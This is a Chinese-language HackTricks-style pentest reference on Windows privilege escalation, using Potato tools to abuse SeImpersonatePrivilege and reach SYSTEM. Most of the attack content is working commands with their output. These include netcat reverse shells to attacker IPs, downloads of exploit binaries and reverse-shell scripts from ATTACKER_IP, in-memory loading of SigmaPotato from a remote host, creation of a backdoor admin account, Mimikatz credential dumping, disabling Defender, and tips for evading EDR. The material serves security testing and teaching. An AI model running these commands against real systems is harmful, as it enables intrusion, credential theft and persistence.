# RoguePotato、PrintSpoofer、SharpEfsPotato、GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato 无法工作**于 Windows Server 2019 和 Windows 10 build 1809 及更高版本。不过，可以使用 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**、**[**GodPotato**](https://github.com/BeichenDream/GodPotato)**、**[**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**、**[**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** 来 **利用相同的 privileges 并获得 `NT AUTHORITY\SYSTEM`** 级别的访问权限。这篇 [博客文章](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) 深入介绍了 `PrintSpoofer` 工具，该工具可用于在 JuicyPotato 不再工作的 Windows 10 和 Server 2019 主机上滥用 impersonation privileges。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025 年经常维护的现代替代方案是 SigmaPotato（GodPotato 的 fork），它增加了 in-memory/.NET reflection 使用方式以及更广泛的 OS 支持。请参阅下方的快速用法和 References 中的 repo。

相关背景和手动技术页面：

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements 和常见陷阱

以下所有技术都依赖于从持有以下任一 privilege 的 context 中滥用具有 impersonation 能力的 privileged service：

- SeImpersonatePrivilege（最常见）或 SeAssignPrimaryTokenPrivilege
- 如果 token 已经拥有 SeImpersonatePrivilege，则不要求 High integrity（许多 service account 都是这种情况，例如 IIS AppPool、MSSQL 等）

快速检查 privileges：
```cmd
whoami /priv | findstr /i impersonate
```
操作注意事项：

- 如果你的 shell 运行在缺少 SeImpersonatePrivilege 的受限 token 下（在某些场景中，Local Service/Network Service 常见此情况），请使用 FullPowers 恢复该账户的默认权限，然后运行 Potato。例如：`FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer 需要 Print Spooler 服务正在运行，并且可通过本地 RPC endpoint (spoolss) 访问。在为应对 PrintNightmare 而禁用 Spooler 的 hardened 环境中，优先使用 RoguePotato/GodPotato/DCOMPotato/EfsPotato。
- RoguePotato 要求 TCP/135 上的 OXID resolver 可访问。如果出站流量被阻止，请使用 redirector/port-forwarder（参见下方示例）。旧版本需要使用 -f flag。
- EfsPotato/SharpEfsPotato 利用 MS-EFSR；如果某个 pipe 被阻止，请尝试其他 pipe（lsarpc、efsrpc、samr、lsass、netlogon）。
- RpcBindingSetAuthInfo 期间出现错误 0x6d3，通常表示未知或不受支持的 RPC authentication service；请尝试其他 pipe/transport，或确认目标服务正在运行。
- “Kitchen-sink” forks（例如 DeadPotato）会捆绑额外的 payload modules（Mimikatz/SharpHound/Defender off），这些模块会接触磁盘；与精简版 originals 相比，预计会触发更高的 EDR detection。

## 快速演示

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意：
- 可以使用 `-i` 在当前控制台中启动交互式进程，或使用 `-c` 运行单行命令。
- 需要 Spooler 服务。如果该服务已禁用，操作将失败。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
如果出站 135 端口被阻止，可以通过 redirector 上的 socat 转发 OXID resolver：<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato 是一种较新的 COM abuse primitive，于 2022 年底发布，目标是 **PrintNotify** service，而不是 Spooler/BITS。该 binary 会实例化 PrintNotify COM server，替换为伪造的 `IUnknown`，然后通过 `CreatePointerMoniker` 触发 privileged callback。当以 **SYSTEM** 身份运行的 PrintNotify service 回连时，进程会复制返回的 token，并以完整权限启动所提供的 payload。<sup>[[13]](#references)</sup>

Key operational notes:

* 可在 Windows 10/11 和 Windows Server 2012–2022 上运行，只要系统安装了 Print Workflow/PrintNotify service（即使在 PrintNightmare 之后禁用了 legacy Spooler，该 service 仍然存在）。
* 要求 calling context 持有 **SeImpersonatePrivilege**（IIS APPPOOL、MSSQL 和 scheduled-task service accounts 通常具备该权限）。
* 支持直接执行 command，也支持 interactive mode，因此可以继续使用原始 console。示例：

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 由于它完全基于 COM，不需要 named-pipe listeners 或 external redirectors，因此在 Defender 阻止 RoguePotato 的 RPC binding 的主机上，可以直接作为 drop-in replacement 使用。

Ink Dragon 等 Operators 会在通过 SharePoint 获得 ViewState RCE 后立即执行 PrintNotifyPotato，将 `w3wp.exe` worker 提权至 SYSTEM，然后安装 ShadowPad。<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
提示：如果某个 pipe 失败或 EDR 阻止了它，请尝试其他受支持的 pipe：
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
注意：
- 当存在 SeImpersonatePrivilege 时，适用于 Windows 8/8.1–11 和 Server 2012–2022。
- 获取与已安装 runtime 匹配的 binary（例如，在现代 Server 2022 上使用 `GodPotato-NET4.exe`）。
- 如果初始 execution primitive 是具有较短 timeout 的 webshell/UI，请将 payload 作为 script 进行 staging，然后让 GodPotato 运行该 script，而不是执行较长的 inline command。<sup>[[12]](#references)</sup>

来自可写 IIS webroot 的快速 staging 模式：
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato 提供了两个针对默认使用 RPC_C_IMP_LEVEL_IMPERSONATE 的服务 DCOM 对象的变体。构建或使用提供的 binaries，然后运行你的 command：
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato（更新版 GodPotato fork）

SigmaPotato 增加了现代化功能，例如通过 .NET reflection 进行内存执行，以及 PowerShell reverse shell helper。<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
2024–2025 builds (v1.2.x) 中的其他优势：
- 内置 reverse shell flag `--revshell`，并移除了 1024 字符的 PowerShell 限制，因此可以一次性执行较长的 AMSI-bypassing payload。
- 支持 reflection-friendly syntax（`[SigmaPotato]::Main()`），并通过 `VirtualAllocExNuma()` 实现基础的 AV evasion，以干扰简单的 heuristics。
- 单独提供针对 .NET 2.0 编译的 `SigmaPotatoCore.exe`，用于 PowerShell Core 环境。

### DeadPotato（2024 GodPotato rework with modules）

DeadPotato 保留了 GodPotato 的 OXID/DCOM impersonation chain，同时内置 post-exploitation helpers，使 operators 能够立即获取 SYSTEM，并执行 persistence/collection，而无需额外 tooling。<sup>[[15]](#references)</sup>

常用 modules（全部需要 SeImpersonatePrivilege）：

- `-cmd "<cmd>"` — 以 SYSTEM 身份 spawn 任意 command。
- `-rev <ip:port>` — 快速 reverse shell。
- `-newadmin user:pass` — 创建 local admin，用于 persistence。
- `-mimi sam|lsa|all` — drop 并运行 Mimikatz 以 dump credentials（会接触磁盘，动静较大）。
- `-sharphound` — 以 SYSTEM 身份运行 SharpHound collection。
- `-defender off` — 关闭 Defender real-time protection（动静非常大）。

示例 one-liners：
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
由于它附带了额外的二进制文件，预计会触发更多 AV/EDR 标记；需要隐蔽性时，请使用更精简的 GodPotato/SigmaPotato。

## 参考资料

- [1] [PrintSpoofer – 在 Windows 10 和 Server 2019 上滥用 Impersonation Privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [不再有 JuicyPotato？旧故事，欢迎 RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – 为 service accounts 恢复默认 token privileges](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction 指向 webroot 的 RCE → FullPowers + GodPotato 提权至 SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato 提权至 SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – 深入 Ink Dragon：揭示隐秘 offensive operation 的 Relay Network 和内部工作原理](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – 内置 post-ex modules 的 GodPotato 重制版](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
